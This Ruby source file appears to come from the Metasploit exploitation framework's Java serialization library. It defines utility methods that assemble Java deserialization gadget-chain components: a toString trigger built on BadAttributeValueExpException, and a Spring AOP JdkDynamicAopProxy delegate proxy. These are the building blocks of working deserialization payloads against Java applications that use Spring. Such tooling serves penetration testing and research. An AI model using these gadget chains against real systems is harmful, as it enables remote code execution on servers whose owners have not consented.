# -*- coding: binary -*-
require 'rex/java/serialization/metamodel'

module Rex
  module Java
    module Serialization
      module Payloads
        class Util
          def make_tostring(obj)
            # simple but only works without a securitymanager
            # TODO: offer other options (xstring,..)
            Model::JavaObject.new('Ljavax/management/BadAttributeValueExpException;', 'val' => obj)
          end

          def delegateproxy(obj)
            # TODO: other options?, AnnotationInvocationHandler only works for quite old Java
            delegateproxy_aop(obj)
          end

          def delegateproxy_aop(obj)
            as = Model::JavaObject.new('Lorg/springframework/aop/framework/AdvisedSupport;', 
                                       'targetSource' => Model::JavaObject.new('Lorg/springframework/aop/target/SingletonTargetSource;', 'target' => obj),
                                       'advisorChainFactory' => Model::JavaObject.new('Lorg/springframework/aop/framework/DefaultAdvisorChainFactory;', {}),
                                       'advisors' => Model::JavaObject.new('Ljava/util/ArrayList;', {}),
                                       'advisorArray' => Model::JavaArray.new('Lorg/springframework/aop/Advisor;', []))

            Model::JavaObject.new('Lorg/springframework/aop/framework/JdkDynamicAopProxy;', 
                                  'advised' => as)
          end
        end
      end
    end
  end
end
